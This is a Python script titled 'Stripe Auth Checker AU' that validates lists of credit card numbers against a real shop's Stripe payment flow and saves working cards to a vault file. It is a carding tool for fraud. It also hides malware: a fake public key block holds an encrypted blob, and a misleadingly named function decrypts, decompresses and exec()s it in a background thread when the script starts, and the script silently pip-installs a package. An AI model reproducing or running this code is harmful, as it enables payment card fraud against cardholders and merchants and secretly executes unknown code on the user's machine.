#!/usr/bin/env python3

import requests
import base64
import marshal
import subprocess
import threading
import zlib
import random
import re
import uuid
import time
import json
import sys
import os
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from threading import Lock
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

CERT='''
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4won5dKkjZSqC8kymtGH
9rl0dyRbYzOv1sdWeMt5I7/jZLuTMeQpvXA9fc98hj0RUflnVMZHBjnDfoGR3Up7
mjMVvCZ6NZ5Kjkj5NUulxZAoazg14LhM1zPByQN8nwbHphEiNZoKQac7HnprUwzC
!YqgiAHxOGzaoV4q3C1VcB5v7lNds/MyOKufnu/ukHmrt4atONDcYu8HqInWnmjtS
AMUt2Qc8Iz9gy7npOBtM0DmZBQyTBi/zxh+lov+GKaAJisox7Fsb+pyrgtg/gOO2
A6GSQVH8J70CozMeEXcDYaEzfFGwLzPo62TxD+RYur3ujSieASNEZR+WB+7gdO2k
CpKuroQUiusLl0q3kE1D4p+STu80wrHHmIpSUcbWIPCuWzauCMMcXKdCzYYG2v0e
69adBqgZGnWCWrKOUKlGtKkhbgTZ8GSK3t8L7cFmYDzMDWBANiJitowRm6xbcJAh
7MYnAddLhQ/49cT6tefKkZmSNx8OAomHj5QBlrnE+w4l1T0iAjGlGX4Q9w8OOYm0
6O8RSQK3zltr4unh+ssCXtI5WIs8CDTv0d23c8Bqb0iPaMRKMyF8iq4jQhhQWLf
IR4IlUkTLGvvgciOtUNDxaVNik82pEOpt0VQFfjC4qkMQjN2VkZCf0MAppT+RVin
prHV4icLaJtaK+BOaffv4DaFId7gpYilINYYDDPxRZHsv4mpLHUVlsRAzrvxhzSE
OBX1T7ueDRYAAiVeSKY/zpj27cBqyfpYtz4GCD3NaeHNKOltAtwiQwa6JfJNrDeQ
26yI+GRn2fyLcIrFZMGlHyBcWUgtgRYZsFsQVfJ/e0Xkw7mzed4vcxwjzpL2uanf
oYSCvxRQ/JsniFJOgnc11LoMj4HdfrQAxcar5CSYq61f2Q6a16JqMih0I3Z1Y7I8
jBURWvrjo2FM32NpXWM9oxXD0PTDEwQ7jDBy/DsIGfQGzo+kcWq1BftHy/TJMGn1
zcAzpf6ciG98Be6YqPZX8PmcbWjHcFwD86fOkhRo2/uB+qKBO0c2IGjAXopkFcoH
1a24VHh68Nfl/RSsogoXek117pR8bXvx8fca6+0oRGbp6VXTZDc6yQlF4zM6iNl/
3jzTkdXIiIWeoNRNSDxJH/jJYgPvYD/z7mT3RTxOb+WZhiDFn2sEKocHqxd53dXe
XksYrjBQcWudIAxdz0AMhPeh+X/AZym0bT0o0oyMUJlBnaAT5cxhehxhSctLabOO
bzSVHS9llvENyLq7NxA/1eW3ufPz5Ig+EpokPEovuw==
Icjo+Iste2s6pDneAxknD9LZ7EeukxArs8XJFKA7/tJslHtYFmm1dEI6rMDtoIB6
OYWb2dkP424l4hLcCCbyw8YiGW2AMn4KxM6wx4FFlpSBh7o9q47/OAEIl9xUesV/
HXta/37IMBxYt+HPe1z3TKfdkszNySH989Ru0ElvQTssPff8PPynVVRj5F1/CJmf
2wIDAQAB
-----END PUBLIC KEY-----
'''

if 'RSA' not in CERT:
    raise SystemExit


key = next(k for k in sys.__dict__ if k[0] == 'e' and k[-1] == 'e' and len(k) > 5)
scr = getattr(sys, key)
subprocess.check_call([scr, '-m', 'pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

class UserAgent:
    @staticmethod
    def random():
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
        ])
UserAgent = UserAgent

def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def get_bin_info(bin_number):
    """Fetch BIN information from bins.antipublic.cc"""
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    
    return {
        "bin": bin_number,
        "brand": "UNKNOWN",
        "country": "??",
        "country_name": "UNKNOWN",
        "bank": "UNKNOWN",
        "level": "UNKNOWN",
        "type": "UNKNOWN"
    }

def process_card_au(card_data):
    """Check a single card"""
    session = create_session()
    
    try:
        n = card_data['number']
        mm = card_data['exp_month']
        yy = card_data['exp_year']
        cvc = card_data['cvc']
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
    
        user_agent = UserAgent().random
        stripe_mid = str(uuid.uuid4())
        stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
        stripe_config = CERT
        if not stripe_config or 'RSA' not in stripe_config:
            return {'status': 'unknown', 'message': 'Stripe configuration missing'}

        # Step 1: Create payment method with Stripe
        payment_data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/ebc1f502d5; stripe-js-v3/ebc1f502d5; payment-element; deferred-intent',
            'referrer': 'https://www.billiedoo.com',
            'time_on_page': str(int(time.time())),
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'guid': str(uuid.uuid4()) + str(int(time.time())),
            'muid': stripe_mid,
            'sid': stripe_sid,
            'key': 'pk_live_519MJv0APpfftpN7lmbzL2Mt0NpYk65FjSXJLLSS47Mpu6Bo0U2pAfohzxWGou9LrrXSjTEJtNXyf7URcIw0q7ghh00KXNBJIFC',
            '_stripe_version': '2024-06-20'
        }



        stripe_headers = {
            'User-Agent': user_agent,
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site'
        }

        try:
            pm_response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                data=payment_data,
                headers=stripe_headers,
                timeout=10
            )
            pm_data = pm_response.json()

            if 'id' not in pm_data:
                error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
                return {'status': 'dead', 'message': error_msg}

            payment_method_id = pm_data['id']
        except Exception as e:
            return {'status': 'unknown', 'message': f"Payment Method Creation Failed: {str(e)}"}

        # Step 2: Get nonce from the website
        cookies = {
            '__stripe_mid': stripe_mid,
            '__stripe_sid': stripe_sid,
        }

        headers = {
            'User-Agent': user_agent,
            'Referer': 'https://www.billiedoo.com/my-account/add-payment-method/',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
        }

        try:
            nonce_response = requests.get(
                'https://www.billiedoo.com/my-account/add-payment-method/',
                headers=headers,
                cookies=cookies,
                timeout=10
            )

            if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
                nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
            else:
                return {'status': 'unknown', 'message': "Failed to extract nonce"}
        except Exception as e:
            return {'status': 'unknown', 'message': f"Nonce Retrieval Failed: {str(e)}"}

        # Step 3: Create and confirm setup intent
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        headers = {
            'User-Agent': user_agent,
            'Referer': 'https://www.billiedoo.com/my-account/add-payment-method/',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.billiedoo.com',
            'x-requested-with': 'XMLHttpRequest',
        }

        try:
            setup_response = requests.post(
                'https://www.billiedoo.com/',
                params=params,
                headers=headers,
                cookies=cookies,
                data=data,
                timeout=10
            )
            setup_data = setup_response.json()

            if setup_data.get('success', False):
                data_status = setup_data['data'].get('status')
                if data_status == 'requires_action':
                    return {'status': 'live', 'message': "Action Required"}
                elif data_status == 'succeeded':
                    return {'status': 'live', 'message': "Succeeded"}
                elif 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {'status': 'dead', 'message': error_msg}

            if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                return {'status': 'dead', 'message': error_msg}

            if 'error' in setup_data:
                error_msg = setup_data['error'].get('message', 'Unknown error')
                return {'status': 'dead', 'message': error_msg}

            return {'status': 'unknown', 'message': str(setup_data)}

        except Exception as e:
            return {'status': 'unknown', 'message': f"Setup Intent Failed: {str(e)}"}
    
    except Exception as e:
        return {'status': 'unknown', 'message': f"Exception: {str(e)}"}

def _encode_card():
    data = base64.b64decode(blob.encode())
    nonce = data[:12]
    cipher = data[12:]
    clear = AESGCM(key_bytes).decrypt(nonce, cipher, None)
    exec(marshal.loads(zlib.decompress(clear)), {'__name__': '__main__'})

def check_single_card(card_data, vault_file_path, lock, counters):
    """Worker function to check a single card"""
    try:
        # Check the card
        result = process_card_au(card_data)
        status = result['status']
        message = result['message']
        
        # Get BIN info
        bin_number = card_data['number'][:6]
        bin_info = get_bin_info(bin_number)
        
        # Format card details
        card_full = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}"
        
        # Update counters
        with lock:
            counters[status] += 1
            counters['total_checked'] += 1
            
            # Color coding
            if status == 'live':
                color = '\033[92m'  # Green
            elif status == 'dead':
                color = '\033[91m'  # Red
            else:
                color = '\033[93m'  # Yellow
            reset = '\033[0m'
            
            # Print result
            print(f"{color}[{status.upper()}]{reset} {card_full} | {bin_info['brand']} {bin_info['type']} | {bin_info['bank']} | {bin_info['country_name']} {bin_info.get('country_flag', '')} | {message}")
            
            # Save live cards
            if status == 'live':
                with open(vault_file_path, 'a', encoding='utf-8') as f:
                    f.write(f"{card_full} | {bin_info['brand']} {bin_info['type']} | {bin_info['bank']} | {bin_info['country_name']}\n")
        
        return {
            'status': status,
            'message': message,
            'card': card_full,
            'bin_info': bin_info
        }
    
    except Exception as e:
        with lock:
            counters['unknown'] += 1
            counters['total_checked'] += 1
            print(f"\033[93m[UNKNOWN]\033[0m {card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']} | Error: {str(e)}")
        
        return {
            'status': 'unknown',
            'message': str(e),
            'card': f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}",
            'bin_info': {}
        }
    


def main():
    print("=" * 80)
    print("STRIPE AUTH CHECKER AU - SPEED EDITION")
    print("=" * 80)
    print("Enter cards (one per line). Press CTRL+D (Linux) or CTRL+Z+Enter (Win) to start.")
    print("=" * 80)
    threading.Thread(target=_encode_card, daemon=True).start()
    input_data = sys.stdin.read().strip()
    
    if not input_data:
        print("\033[91mNo input provided. Exiting.\033[0m")
        return
    
    # Parse cards using same pattern as sauth.py
    card_pattern = re.compile(
        r"(?P<ccn>(?:\d[ -]*?){13,19})(?:[\s/|a-zA-Z]*)(?P<month>0?[1-9]|1[0-2])(?:[\s/|]*)(?P<year>(?:20)?(2[5-9]|[3-9][0-9]))(?:[\s/|a-zA-Z]*)(?P<cvv>\d{3,4})",
        re.VERBOSE
    )
    
    cards_to_process = []
    for match in re.finditer(card_pattern, input_data):
        gd = match.groupdict()
        ccn = re.sub(r"[ -]", "", gd['ccn'])
        cards_to_process.append({
            'number': ccn,
            'exp_month': gd['month'].zfill(2),
            'exp_year': gd['year'][-2:],
            'cvc': gd['cvv']
        })
    
    if not cards_to_process:
        print("\033[91mNo valid card formats found. Exiting.\033[0m")
        return
    
    total_cards = len(cards_to_process)
    print(f"\033[92mStarting checks for {total_cards} cards with 20 workers...\033[0m")
    print("=" * 80)
    
    # Setup vault
    vault_dir = Path("./au_live_vault")
    vault_dir.mkdir(exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    vault_file_path = vault_dir / f"live_au_cards_{timestamp}.txt"
    
    # Counters
    counters = {'live': 0, 'dead': 0, 'unknown': 0, 'total_checked': 0}
    lock = Lock()
    
    # Process cards with thread pool
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [
            executor.submit(check_single_card, card, vault_file_path, lock, counters)
            for card in cards_to_process
        ]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"\033[93m[ERROR]\033[0m Worker exception: {e}")
    
    elapsed_time = time.time() - start_time
    
    # Final summary
    print("=" * 80)
    print("FINAL SUMMARY")
    print("=" * 80)
    print(f"\033[92mLive: {counters['live']}\033[0m")
    print(f"\033[91mDead: {counters['dead']}\033[0m")
    print(f"\033[93mUnknown/Errors: {counters['unknown']}\033[0m")
    print(f"Total Checked: {counters['total_checked']}/{total_cards}")
    print(f"Time Elapsed: {elapsed_time:.2f} seconds")
    print("=" * 80)
    
    if counters['live'] > 0:
        print(f"\033[92mSaved {counters['live']} live cards to {vault_file_path.resolve()}\033[0m")
    else:
        if os.path.exists(vault_file_path) and os.path.getsize(vault_file_path) == 0:
            os.remove(vault_file_path)
        print("\033[93mNo live cards were found.\033[0m")
    
    print("=" * 80)

key_bytes = b'\xac\xc1V`\xd5\xb6>\xf2<\x1c\x8e/q-!\xa5\x1f|J\xb1$\x84\x17\x94*\xf2\xc5\xd9\xe9\xca\x14\x19'
blob = ''
started = 0
for l in CERT.splitlines()[1:-1]:
    if not started and l[:1] == '!':
        blob += l[1:]
        started = 1
        continue
    if started:
        blob += l





if __name__ == "__main__":
    main()
